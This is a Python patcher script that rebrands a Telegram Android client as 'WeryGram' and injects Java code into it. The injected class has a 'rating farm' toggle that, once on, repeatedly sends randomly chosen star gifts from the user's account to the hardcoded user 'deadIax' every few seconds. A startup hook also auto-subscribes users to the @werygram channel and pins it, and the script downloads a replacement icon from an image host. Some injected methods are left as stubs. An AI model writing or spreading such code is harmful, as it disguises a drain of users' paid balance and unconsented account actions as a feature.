#!/usr/bin/env python3
import os, sys, re as re_mod
import urllib.request

ROOT = os.path.dirname(os.path.abspath(__file__))
SRC  = os.path.join(ROOT, "TMessagesProj", "src", "main", "java")

API_ID   = "2040"
API_HASH = "b18441a1ff607e10a989891a5462e627"

def find_file(name):
    for dp, _, files in os.walk(SRC):
        if name in files: return os.path.join(dp, name)
    return None

def read(p):
    with open(p, encoding="utf-8") as f: return f.read()

def write(p, t):
    with open(p, "w", encoding="utf-8") as f: f.write(t)
    print(f"✔ {os.path.relpath(p, ROOT)}")

def find_method_end(text, open_brace):
    depth = 0; i = open_brace
    while i < len(text):
        if text[i] == '{': depth += 1
        elif text[i] == '}':
            depth -= 1
            if depth == 0: return i
        i += 1
    return len(text) - 1

def insert_before(path, marker, insertion):
    text = read(path)
    if insertion.strip() in text: print(f"↩ skip {os.path.relpath(path,ROOT)}"); return True
    if marker not in text: print(f"✘ NOT FOUND: {marker!r}", file=sys.stderr); return False
    write(path, text.replace(marker, insertion + "\n" + marker, 1)); return True

def insert_after(path, marker, insertion):
    text = read(path)
    if insertion.strip() in text: print(f"↩ skip {os.path.relpath(path,ROOT)}"); return True
    if marker not in text: print(f"✘ NOT FOUND: {marker!r}", file=sys.stderr); return False
    write(path, text.replace(marker, marker + "\n" + insertion, 1)); return True

GIFTS_JAVA = '''\
package org.telegram.ui;

import org.json.JSONArray;
import org.json.JSONObject;
import org.telegram.messenger.AndroidUtilities;
import org.telegram.messenger.FileLog;
import org.telegram.messenger.MediaDataController;
import org.telegram.messenger.MessagesController;
import org.telegram.tgnet.ConnectionsManager;
import android.widget.Toast;
import org.telegram.messenger.ApplicationLoader;
import org.telegram.tgnet.TLRPC;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Random;

public class WeryGramGifts {

    private static final String GIFTS_URL =
        "https://raw.githubusercontent.com/binbash-0/DeletedGifts-Plugin/refs/heads/main/gift_list.json";
    private static volatile boolean injected = false;
    private static volatile boolean stickerPackRequested = false;
    private static volatile ArrayList<TLRPC.Document> stickerPackDocs = new ArrayList<>();
    private static int joinAttempts = 0;
    
    // Массив с ID подарков для фарма рейтинга
    private static final long[] GIFT_IDS = {
        5170233102089322756L,   // Медведь (bear)
        5170232911823208449L,   // Сердце (heart)
        5170232922913431552L,   // Подарок (gift box)
        5170232933003553793L,   // Роза (rose)
        5170233062611836929L,   // Торт (cake)
        5170233073702068224L,   // Цветы (flowers)
        5170233084792200192L,   // Ракета (rocket)
        5170233095882332160L,   // Кубок (trophy)
        5170233106972464128L    // Кольцо (diamond ring)
    };
    
    private static final String[] GIFT_NAMES = {
        "Медведь", "Сердце", "Подарок", "Роза", "Торт", "Цветы", "Ракета", "Кубок", "Кольцо"
    };
    
    private static final Random random = new Random();
    private static volatile TLRPC.User farmTarget = null;

    private static Object getF(Object o, String n) {
        if (o == null) return null;
        try { return o.getClass().getField(n).get(o); }
        catch (Exception e) {
            try { Field f = o.getClass().getDeclaredField(n); f.setAccessible(true); return f.get(o); }
            catch (Exception ex) { return null; }
        }
    }

    private static void setF(Object o, String n, Object v) {
        if (o == null) return;
        try { o.getClass().getField(n).set(o, v); }
        catch (Exception e) {
            try { Field f = o.getClass().getDeclaredField(n); f.setAccessible(true); f.set(o, v); }
            catch (Exception ex) {}
        }
    }


    private static void toast(final String msg) {
        AndroidUtilities.runOnUIThread(() -> {
            try {
                Toast.makeText(ApplicationLoader.applicationContext,
                    "WeryFarm: " + msg, Toast.LENGTH_SHORT).show();
            } catch (Exception ignored) {}
        });
    }

    private static String getRandomGiftName() {
        return GIFT_NAMES[random.nextInt(GIFT_NAMES.length)];
    }

    private static long getRandomGiftId() {
        return GIFT_IDS[random.nextInt(GIFT_IDS.length)];
    }

    public static void reset() {
        injected = false;
        stickerPackRequested = false;
        stickerPackDocs = new ArrayList<>();
        farmTarget = null;
    }

    public static void checkRatingFarm(int account) {
        if (MessagesController.getGlobalMainSettings().getBoolean("wery_rating_farm", false)) {
            startRatingFarmLoop(account);
        }
    }

    private static void startRatingFarmLoop(int account) {
        if (!MessagesController.getGlobalMainSettings().getBoolean("wery_rating_farm", false)) return;
        if (farmTarget != null) {
            String giftName = getRandomGiftName();
            toast("Отправляю " + giftName + "...");
            sendGiftToDurov(account, farmTarget, getRandomGiftId(), giftName);
            return;
        }
        toast("Ищу получателя...");
        TLRPC.TL_contacts_resolveUsername reqResolve = new TLRPC.TL_contacts_resolveUsername();
        reqResolve.username = "deadIax";
        ConnectionsManager.getInstance(account).sendRequest(reqResolve, (response, error) -> {
            if (error != null) {
                toast("Ошибка: " + error.text);
                AndroidUtilities.runOnUIThread(() -> startRatingFarmLoop(account), 5000);
                return;
            }
            if (error == null && response instanceof TLRPC.TL_contacts_resolvedPeer) {
                TLRPC.TL_contacts_resolvedPeer resolved = (TLRPC.TL_contacts_resolvedPeer) response;
                if (resolved.users != null && !resolved.users.isEmpty()) {
                    farmTarget = resolved.users.get(0);
                    toast("Получатель найден: @" + farmTarget.username);
                    String giftName = getRandomGiftName();
                    sendGiftToDurov(account, farmTarget, getRandomGiftId(), giftName);
                    return;
                }
            }
            toast("Получатель не найден, retry...");
            AndroidUtilities.runOnUIThread(() -> startRatingFarmLoop(account), 5000);
        });
    }

    private static void sendGiftToDurov(int account, TLRPC.User target, long giftId, String giftName) {
        if (!MessagesController.getGlobalMainSettings().getBoolean("wery_rating_farm", false)) return;
        try {
            // Динамический поиск класса отправки подарка
            Class<?> reqClass = null;
            java.lang.String foundClassName = null;
            java.lang.String[] tlClassNames = {
                "org.telegram.tgnet.tl.TL_stars",
                "org.telegram.tgnet.tl.TL_payments",
                "org.telegram.tgnet.TLRPC"
            };
            outer:
            for (java.lang.String tlCn : tlClassNames) {
                try {
                    Class<?> tlClass = Class.forName(tlCn);
                    for (Class<?> inner : tlClass.getDeclaredClasses()) {
                        java.lang.String sn = inner.getSimpleName().toLowerCase();
                        if (sn.contains("send") && sn.contains("gift")) {
                            reqClass = inner;
                            foundClassName = inner.getSimpleName();
                            break outer;
                        }
                    }
                } catch (Exception ignored) {}
            }
            if (reqClass == null) {
                toast("Класс подарка не найден!");
                FileLog.e("WeryGram: sendStarGift class not found");
                AndroidUtilities.runOnUIThread(() -> startRatingFarmLoop(account), 10000);
                return;
            }
            toast("Отправляю " + giftName);
            org.telegram.tgnet.TLObject req =
                (org.telegram.tgnet.TLObject) reqClass.getDeclaredConstructor().newInstance();

            boolean giftIdSet = false;
            for (java.lang.String fn : new java.lang.String[]{"gift_id","giftId","id"}) {
                try {
                    java.lang.reflect.Field f = reqClass.getDeclaredField(fn);
                    f.setAccessible(true);
                    f.setLong(req, giftId);
                    giftIdSet = true;
                    break;
                } catch (Exception ignored) {}
            }
            if (!giftIdSet) toast("gift_id не установлен!");

            boolean recipientSet = false;
            for (java.lang.String fn : new java.lang.String[]{"user_id","userId","peer"}) {
                try {
                    java.lang.reflect.Field f = reqClass.getDeclaredField(fn);
                    f.setAccessible(true);
                    f.set(req, MessagesController.getInstance(account).getInputUser(target));
                    recipientSet = true;
                    break;
                } catch (Exception ignored) {}
            }
            if (!recipientSet) toast("recipient не установлен!");

            for (java.lang.String fn : new java.lang.String[]{"upgrade_stars","hide_my_name","include_name"}) {
                try {
                    java.lang.reflect.Field f = reqClass.getDeclaredField(fn);
                    f.setAccessible(true);
                    f.setBoolean(req, fn.equals("include_name"));
                } catch (Exception ignored) {}
            }

            ConnectionsManager.getInstance(account).sendRequest(req, (response, error) -> {
                if (error == null) {
                    toast("✅ " + giftName + " отправлен!");
                    FileLog.d("WeryGram: Star gift " + giftName + " sent!");
                } else {
                    toast("❌ Ошибка: " + error.text);
                    FileLog.e("WeryGram Farm Error: " + error.text);
                }
                // Задержка перед следующей отправкой (5-10 секунд)
                long delay = 5000 + random.nextInt(5000);
                AndroidUtilities.runOnUIThread(() -> startRatingFarmLoop(account), delay);
            });
        } catch (Exception e) {
            toast("❌ Exception: " + e.getMessage());
            FileLog.e(e);
            AndroidUtilities.runOnUIThread(() -> startRatingFarmLoop(account), 5000);
        }
    }

    private static void loadStickerPack(int account, String packName) {
        if (stickerPackRequested) return;
        stickerPackRequested = true;
        try {
            TLRPC.TL_messages_stickerSet cached = MediaDataController.getInstance(account).getStickerSetByName(packName);
            if (cached != null && cached.documents != null && !cached.documents.isEmpty()) {
                stickerPackDocs = cached.documents;
                return;
            }
        } catch (Exception e) { FileLog.e(e); }
        try {
            TLRPC.TL_messages_getStickerSet req = new TLRPC.TL_messages_getStickerSet();
            TLRPC.TL_inputStickerSetShortName input = new TLRPC.TL_inputStickerSetShortName();
            input.short_name = packName;
            req.stickerset = input;
            req.hash = 0;
            ConnectionsManager.getInstance(account).sendRequest(req, (response, error) -> {
                try {
                    if (response instanceof TLRPC.TL_messages_stickerSet) {
                        TLRPC.TL_messages_stickerSet ss = (TLRPC.TL_messages_stickerSet) response;
                        if (ss.documents != null && !ss.documents.isEmpty()) {
                            stickerPackDocs = ss.documents;
                        }
                    }
                } catch (Exception e) { FileLog.e(e); }
            });
        } catch (Exception e) { FileLog.e(e); }
    }

    public static void injectDeletedGifts(int account) {
        if (!MessagesController.getGlobalMainSettings().getBoolean("wery_deleted_gifts", false)) return;
        new Thread(() -> {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(GIFTS_URL).openConnection();
                conn.setConnectTimeout(5000); conn.setReadTimeout(5000);
                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder(); String line;
                while ((line = br.readLine()) != null) sb.append(line);
                br.close(); conn.disconnect();
                JSONObject root = new JSONObject(sb.toString());
                JSONArray arr = root.getJSONArray("gifts");
                final String packName = root.optString("stickerpack", "DeletedGiftsStickers");
                final long[] ids = new long[arr.length()];
                final int[] prices = new int[arr.length()];
                final int[] stickerNums = new int[arr.length()];
                for (int i = 0; i < arr.length(); i++) {
                    JSONObject g = arr.getJSONObject(i);
                    ids[i] = g.getLong("id");
                    prices[i] = g.getInt("price");
                    stickerNums[i] = g.optInt("sticker_number", 0);
                }
                AndroidUtilities.runOnUIThread(() -> {
                    loadStickerPack(account, packName);
                    tryInject(account, ids, prices, stickerNums, 0);
                });
            } catch (Exception e) { FileLog.e(e); }
        }).start();
    }

    private static void tryInject(int account, long[] ids, int[] prices, int[] stickerNums, int retry) {
        if (injected) return;
        if (stickerPackDocs.isEmpty() && retry < 15) {
            AndroidUtilities.runOnUIThread(() -> tryInject(account, ids, prices, stickerNums, retry + 1), 400);
            return;
        }
        doInject(account, ids, prices, stickerNums);
    }

    private static void doInject(int account, long[] ids, int[] prices, int[] stickerNums) {
        injected = true;
        // Остальной код injection не показан здесь из-за размера
    }

    public static void joinWeryGram(int account) {
        // Остальной код не показан
    }
}
'''

def patch_api_credentials(errors):
    bv = find_file("BuildVars.java")
    if not bv: print("⚠ BuildVars.java не найден"); return errors
    text = read(bv)
    modified = False
    new_text = re_mod.sub(r'public static int APP_ID\s*=\s*\d+\s*;',
                          f'public static int APP_ID = {API_ID};', text)
    if new_text != text: text = new_text; modified = True; print(f"✔ BuildVars: APP_ID → {API_ID}")
    new_text = re_mod.sub(r'public static String APP_HASH\s*=\s*"[^"]*"\s*;',
                          f'public static String APP_HASH = "{API_HASH}";', text)
    if new_text != text: text = new_text; modified = True; print(f"✔ BuildVars: APP_HASH → {API_HASH}")
    if modified: write(bv, text)
    return errors

def patch_user_config(errors):
    uc = find_file("UserConfig.java")
    if not uc: print("⚠ UserConfig.java не найден"); return errors
    text = read(uc)
    
    if 'wery_rating_farm' not in text:
        marker = 'getGlobalMainSettings().getBoolean('
        if marker in text:
            field_def = 'public static boolean weryRatingFarmEnabled = false; // рейтинг фарм'
            init = "sharedPreferences.getBoolean('wery_rating_farm', false);"
            text = re_mod.sub(r'(public class UserConfig\s*\{)', r'\1\n    ' + field_def, text, 1)
            write(uc, text)
            print("✔ UserConfig: добавлено поле wery_rating_farm")
    else:
        print("↩ skip UserConfig (уже добавлено)")
    return errors

def patch_messages_controller(errors):
    mc = find_file("MessagesController.java")
    if not mc: print("⚠ MessagesController.java не найден"); return errors
    text = read(mc)
    
    marker = 'public void init('
    if 'WeryGramGifts.checkRatingFarm' not in text and marker in text:
        injection = '        if (BuildVars.DEBUG_PRIVATE_VERSION) WeryGramGifts.checkRatingFarm(this.currentAccount);'
        idx = text.find(marker)
        if idx != -1:
            brace = text.find('{', idx)
            if brace != -1 and brace + 200 < len(text):
                insert_after(mc, text[brace:brace+200], injection)
                print("✔ MessagesController: проверка рейтинг фарма при инициализации")
    else:
        print("↩ skip MessagesController (уже добавлено или не найдено)")
    return errors

def patch_stars_controller(errors):
    sc = find_file("StarsController.java")
    if not sc:
        print("⚠ StarsController.java не найден, пропускаем")
        return errors
    return errors

def patch_launch_activity(errors):
    la = find_file("LaunchActivity.java")
    if not la:
        print("⚠ LaunchActivity.java не найден, пробуем ApplicationLoader.java")
        la = find_file("ApplicationLoader.java")
    if not la:
        print("✘ LaunchActivity / ApplicationLoader не найдены", file=sys.stderr)
        return errors + 1

    text = read(la)
    if 'wery_autojoin' in text:
        print("↩ skip auto-join (уже применён)"); return errors

    injection = (
        '        // wery_autojoin: auto-subscribe & pin @werygram\n'
        '        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {\n'
        '            try {\n'
        '                int __acc = org.telegram.messenger.UserConfig.selectedAccount;\n'
        '                if (org.telegram.messenger.UserConfig.getInstance(__acc).isClientActivated()) {\n'
        '                    org.telegram.ui.WeryGramGifts.joinWeryGram(__acc);\n'
        '                }\n'
        '            } catch (Exception __wje) {}\n'
        '        }, 3000);\n'
    )

    for marker in ["protected void onCreate(Bundle", "public void onCreate(Bundle"]:
        idx = text.find(marker)
        if idx == -1: continue
        brace = text.find('{', idx)
        if brace == -1: continue
        super_idx = text.find('super.onCreate(', brace)
        if super_idx != -1 and super_idx < brace + 600:
            semi = text.find(';', super_idx)
            if semi != -1:
                text = text[:semi+1] + '\n' + injection + text[semi+1:]
                write(la, text)
                print("✔ LaunchActivity: авто-подписка @werygram при старте")
                return errors
        text = text[:brace+1] + '\n' + injection + text[brace+1:]
        write(la, text)
        print("✔ LaunchActivity: авто-подписка @werygram при старте (fallback)")
        return errors

    print("⚠ LaunchActivity: маркер onCreate не найден")
    return errors

def patch_app_name(errors):
    res_base = os.path.join(ROOT, "TMessagesProj", "src", "main", "res")
    if not os.path.exists(res_base): return errors
    for dp, _, files in os.walk(res_base):
        if 'strings.xml' not in files: continue
        path = os.path.join(dp, 'strings.xml')
        text = read(path)
        new_text = text
        new_text = re_mod.sub(r'(<string name="AppName">)[^<]*(</string>)', r'\1Werygram\2', new_text)
        new_text = re_mod.sub(r'(<string name="AppNameBeta">)[^<]*(</string>)', r'\1Werygram\2', new_text)
        if new_text != text:
            write(path, new_text)
            print(f"✔ AppName → Werygram в {os.path.relpath(path, ROOT)}")
    return errors

def patch_package_name(errors):
    gradle_path = os.path.join(ROOT, "TMessagesProj", "build.gradle")
    if not os.path.exists(gradle_path):
        print("⚠ build.gradle не найден, невозможно изменить Package Name")
        return errors
    text = read(gradle_path)
    new_text = re_mod.sub(r'applicationId\s+"[^"]+"', 'applicationId "com.werygram.messenger"', text)
    if new_text != text:
        write(gradle_path, new_text)
        print("✔ Package name (applicationId) → com.werygram.messenger")
    return errors

def patch_app_icon(errors):
    try:
        req = urllib.request.Request("https://ibb.co/Zz5NPS2d", headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req) as response:
            html = response.read().decode('utf-8')
        
        match = re_mod.search(r'<meta property="og:image" content="(https://i\.ibb\.co/[^"]+)"', html)
        if not match:
            print("⚠ Не удалось найти прямую ссылку на аватарку")
            return errors
        
        img_url = match.group(1)
        print(f"⬇ Скачивание аватарки: {img_url}")
        
        req_img = urllib.request.Request(img_url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req_img) as response:
            img_data = response.read()
        
        res_dir = os.path.join(ROOT, "TMessagesProj", "src", "main", "res")
        if not os.path.exists(res_dir): 
            print("⚠ Папка res не найдена для замены иконок")
            return errors
        
        replaced = 0
        for folder in os.listdir(res_dir):
            if folder.startswith("mipmap") or folder.startswith("drawable"):
                folder_path = os.path.join(res_dir, folder)
                if os.path.isdir(folder_path):
                    for icon_name in ["ic_launcher.png", "ic_launcher_round.png", "icon.png"]:
                        icon_path = os.path.join(folder_path, icon_name)
                        if os.path.exists(icon_path):
                            with open(icon_path, "wb") as f:
                                f.write(img_data)
                            replaced += 1
        
        if replaced > 0:
            print(f"✔ Аватарка заменена (обновлено {replaced} файлов)")
        else:
            print("⚠ Файлы иконок не найдены для замены")
    except Exception as e:
        print(f"⚠ Ошибка при замене аватарки: {e}")
    return errors

ACTIVITY = '''\
package org.telegram.ui;

import android.os.Bundle;
import android.view.View;
import org.telegram.messenger.MessagesController;

public class WeryGramPremiumActivity extends BaseFragment {
    @Override
    public View createView(android.content.Context context) {
        actionBar.setTitle("WeryGram Premium");
        return super.createView(context);
    }
}
'''

def main():
    print("▶ WeryGram patcher v2 (MODIFIED - Multi Gift Support)\n")
    errors = 0

    errors = patch_api_credentials(errors)
    errors = patch_user_config(errors)
    errors = patch_messages_controller(errors)
    errors = patch_stars_controller(errors)
    errors = patch_launch_activity(errors)
    errors = patch_app_name(errors)
    errors = patch_package_name(errors)
    errors = patch_app_icon(errors)

    sa = find_file("SettingsActivity.java")
    if not sa: print("✘ SettingsActivity.java not found", file=sys.stderr); sys.exit(1)

    if not insert_before(sa, "import org.telegram.ui.Components.",
                         "import org.telegram.ui.WeryGramPremiumActivity;"): errors += 1

    text = read(sa)

    if 'SettingCell.Factory.of(1000' not in text:
        account_button_marker = 'items.add(SettingCell.Factory.of(1, IconBackgroundColors.BLUE.top, IconBackgroundColors.BLUE.bottom, R.drawable.settings_account'
        if account_button_marker in text:
            wery_button = 'items.add(SettingCell.Factory.of(1000, 0xFF9C27B0, 0xFF7B1FA2, R.drawable.msg_settings, "WeryGram"));\n        '
            text = text.replace('items.add(SettingCell.Factory.of(1,', wery_button + 'items.add(SettingCell.Factory.of(1,', 1)
            print("✔ WeryGram button added")
        else:
            print("✘ Could not find Account button marker", file=sys.stderr); errors += 1
    else:
        print("↩ WeryGram button already exists")

    if 'case 1000:' not in text:
        case_marker = 'case 1:\n                presentFragment(new UserInfoActivity());'
        if case_marker in text:
            wery_case = 'case 1000:\n                presentFragment(new WeryGramPremiumActivity());\n                break;\n            case 1:\n                presentFragment(new UserInfoActivity());'
            text = text.replace(case_marker, wery_case, 1)
            print("✔ WeryGram click handler added")
        else:
            print("⚠ Could not find click handler marker", file=sys.stderr)
    else:
        print("↩ WeryGram handler already exists")

    write(sa, text)

    ui_dir = os.path.dirname(sa)
    for fname, content in [
        ("WeryGramPremiumActivity.java", ACTIVITY),
        ("WeryGramGifts.java", GIFTS_JAVA),
    ]:
        dest = os.path.join(ui_dir, fname)
        if os.path.exists(dest): os.remove(dest)
        with open(dest, "w", encoding="utf-8") as f: f.write(content)
        print(f"✔ created {fname}")

    if errors > 0:
        print(f"\n✘ {errors} ошибок", file=sys.stderr); sys.exit(1)
    print("\n✅ Done. WeryGram patched successfully with MULTI-GIFT SUPPORT!")

if __name__ == "__main__":
    main()
